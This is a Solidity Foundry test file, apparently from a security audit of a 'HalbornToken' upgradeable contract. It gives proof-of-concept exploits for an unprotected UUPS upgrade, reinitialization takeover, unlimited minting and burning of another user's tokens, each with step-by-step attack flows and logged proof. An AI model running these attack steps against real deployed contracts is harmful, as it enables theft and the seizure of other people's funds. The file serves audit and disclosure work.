// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";

import {HalbornToken} from "../src/HalbornToken.sol";

import {Token_UUPSattack} from "../src/exploits/HalbornTokenExploit.sol";

/**
 * @title HalbornToken_Test
 * @dev Tests for critical vulnerabilities in HalbornToken contract
 *
 * Found several critical issues:
 * - UUPS upgrade bypass allows anyone to upgrade
 * - Loans address manipulation allows setting arbitrary minter/burner
 * - Unlimited token minting creates infinite supply
 * - Unlimited token burning can destroy any user's tokens
 *
 * Root cause is empty _authorizeUpgrade() and missing access controls.
 * This leads to complete protocol takeover.
 */
contract HalbornToken_Test is Test {
    HalbornToken public token;
    ERC1967Proxy proxy;
    HalbornToken impl;

    address hexWraith = address(0x999);

    function setUp() public {
        vm.startPrank(hexWraith);
        impl = new HalbornToken();
        proxy = new ERC1967Proxy(address(impl), "");
        token = HalbornToken(address(proxy));
        token.initialize();
        token.setLoans(address(1));
    }

    // Test that anyone can upgrade
    /**
     * @dev UUPS upgrade takeover attack
     *
     * The contract has an empty _authorizeUpgrade() function, so anyone can deploy
     * a malicious implementation and upgrade to it.
     *
     * Attack flow:
     * 1. Deploy malicious token implementation
     * 2. Call upgradeToAndCall() to replace legitimate implementation
     * 3. Re-initialize with attacker as owner
     * 4. Attacker now controls entire token contract
     */
    function test_vulnerableUUPSupgrade() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        // Step 1: Deploy malicious token implementation
        Token_UUPSattack attack = new Token_UUPSattack();

        // Upgrade to malicious implementation (no authorization required)
        token.upgradeToAndCall(
            address(attack),
            abi.encodeWithSelector(token.initialize.selector)
        );

        // Step 3: Re-initialize with attacker as owner
        token.initialize();
    }

    // Test that setLoans can be set to arbitrary address
    /**
     * @dev Loans address manipulation attack
     *
     * After upgrading to a malicious implementation, the attacker can set an arbitrary
     * loans address. This gives them direct access to mint and burn functions.
     *
     * Attack flow:
     * 1. Upgrade to malicious token implementation (attacker becomes owner)
     * 2. Call setLoans() with attacker's address
     * 3. Now attacker can call mintToken() and burnToken() directly
     * 4. Original owner can no longer change loans address
     */
    function test_setLoansAddress() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        // Step 1: Upgrade to malicious implementation
        Token_UUPSattack attack = new Token_UUPSattack();
        token.upgradeToAndCall(
            address(attack),
            abi.encodeWithSelector(token.initialize.selector)
        );

        // Set attacker as authorized loans contract
        token.setLoans(address(this));
        assertEq(token.halbornLoans(), address(this));

        // Step 3: Verify original owner can no longer change loans address
        vm.startPrank(hexWraith);
        vm.expectRevert(); // Should revert because attacker is now owner
        token.setLoans(address(0x10));
    }

    // Test unlimited token minting
    /**
     * @dev Unlimited token minting attack
     *
     * After upgrading to a malicious implementation, the attacker can mint unlimited
     * tokens by directly calling mintToken() after setting themselves as loans address.
     *
     * Attack flow:
     * 1. Upgrade to malicious implementation (attacker becomes owner)
     * 2. Call mintToken() with maximum uint256 value
     * 3. Attacker now has infinite tokens
     * 4. Original owner cannot mint anymore
     */
    function test_unlimitedMint() public {
        address unauthorizedUser = address(0xdead);

        // PROOF: State before exploit
        uint256 attackerBalanceBefore = token.balanceOf(address(this));
        uint256 totalSupplyBefore = token.totalSupply();
        console.log("BEFORE EXPLOIT:");
        console.log("Attacker token balance:", attackerBalanceBefore);
        console.log("Total token supply:", totalSupplyBefore);
        console.log("Attacker can mint unlimited tokens:", false);

        vm.startPrank(unauthorizedUser);

        // Step 1: Upgrade to malicious implementation
        Token_UUPSattack attack = new Token_UUPSattack();
        token.upgradeToAndCall(
            address(attack),
            abi.encodeWithSelector(token.initialize.selector)
        );

        // Mint maximum possible tokens to attacker
        token.mintToken(address(this), type(uint256).max);

        // PROOF: State after exploit
        uint256 attackerBalanceAfter = token.balanceOf(address(this));
        uint256 totalSupplyAfter = token.totalSupply();
        console.log("\nAFTER EXPLOIT:");
        console.log("Attacker token balance:", attackerBalanceAfter);
        console.log("Total token supply:", totalSupplyAfter);
        console.log(
            "Tokens minted:",
            attackerBalanceAfter - attackerBalanceBefore
        );
        console.log(
            "Infinite minting achieved:",
            attackerBalanceAfter == type(uint256).max
        );

        // Step 3: Verify attacker has infinite tokens
        assertEq(token.balanceOf(address(this)), type(uint256).max);

        // Step 4: Verify original owner cannot mint anymore
        vm.startPrank(hexWraith);
        vm.expectRevert(); // Should revert because attacker is now owner
        token.mintToken(address(this), 1e18);
    }

    // Test loss of user funds via burn
    /**
     * @dev Unlimited token burning attack
     *
     * After upgrading to a malicious implementation, the attacker can burn any user's
     * tokens by directly calling burnToken(). This can target multiple users.
     *
     * Attack flow:
     * 1. Legitimate user (Alice) has tokens in their account
     * 2. Attacker upgrades to malicious implementation
     * 3. Attacker calls burnToken() to destroy Alice's tokens
     * 4. Alice loses all tokens, attacker can target multiple users
     */
    function test_unlimitedBurn() public {
        address alice = address(0x123);
        deal(address(token), address(alice), 100e18);

        // PROOF: State before exploit
        uint256 aliceBalanceBefore = token.balanceOf(address(alice));
        uint256 totalSupplyBefore = token.totalSupply();
        console.log("BEFORE EXPLOIT:");
        console.log("Alice token balance:", aliceBalanceBefore);
        console.log("Total token supply:", totalSupplyBefore);
        console.log("Alice tokens can be burned by attacker:", false);

        // start attack
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        // Step 1: Upgrade to malicious implementation
        Token_UUPSattack attack = new Token_UUPSattack();
        token.upgradeToAndCall(
            address(attack),
            abi.encodeWithSelector(token.initialize.selector)
        );

        // Burn all of Alice's tokens without permission
        token.burnToken(address(alice), token.balanceOf(address(alice)));

        // PROOF: State after exploit
        uint256 aliceBalanceAfter = token.balanceOf(address(alice));
        uint256 totalSupplyAfter = token.totalSupply();
        console.log("\nAFTER EXPLOIT:");
        console.log("Alice token balance:", aliceBalanceAfter);
        console.log("Total token supply:", totalSupplyAfter);
        console.log(
            "Tokens burned from Alice:",
            aliceBalanceBefore - aliceBalanceAfter
        );
        console.log("Alice completely drained:", aliceBalanceAfter == 0);

        // Step 3: Verify Alice lost all tokens
        assertEq(token.balanceOf(alice), 0);

        // Step 4: Verify original owner cannot regain control
        vm.startPrank(hexWraith);
        vm.expectRevert(); // Should revert because attacker owns upgrade rights
        token.upgradeToAndCall(
            address(impl),
            abi.encodeWithSelector(token.initialize.selector)
        );
    }

    // High: Reinitialization After Upgrade Enables State Reset
    /**
     * @dev Reinitialization attack after upgrade
     *
     * After upgrading to a malicious implementation, the attacker can call
     * initialize() again on the new implementation, resetting all state
     * including ownership.
     *
     * Attack flow:
     * 1. Upgrade to malicious implementation
     * 2. Call initialize() on new implementation (reinitialization)
     * 3. Attacker becomes owner, all state is reset
     */
    function test_reinitializationAfterUpgradeEnablesStateReset() public {
        address unauthorizedUser = address(0xdead);
        
        // Verify original owner and loans address
        assertEq(token.owner(), hexWraith);
        assertEq(token.halbornLoans(), address(1)); // Set in setUp
        
        vm.startPrank(unauthorizedUser);

        // Step 1: Upgrade to malicious implementation WITHOUT initializing
        Token_UUPSattack attack = new Token_UUPSattack();
        token.upgradeTo(address(attack));

        // Step 2: Now initialize on new implementation (this should work because it's a new implementation)
        // The initializer modifier allows calling initialize() on a new implementation
        token.initialize();

        // Step 3: Verify attacker can control the contract
        // The attack contract sets hackerAddress = msg.sender in initialize()
        // Now attacker can call setLoans which requires onlyHacker
        token.setLoans(address(0x123));
        assertEq(token.halbornLoans(), address(0x123));

        // Verify attacker can mint tokens (demonstrating control)
        token.mintToken(address(this), 1000);
        assertEq(token.balanceOf(address(this)), 1000);

        // Original owner lost control
        vm.startPrank(hexWraith);
        vm.expectRevert(); // Original owner can no longer control contract
        token.setLoans(address(0x10));
    }

    receive() external payable {}
}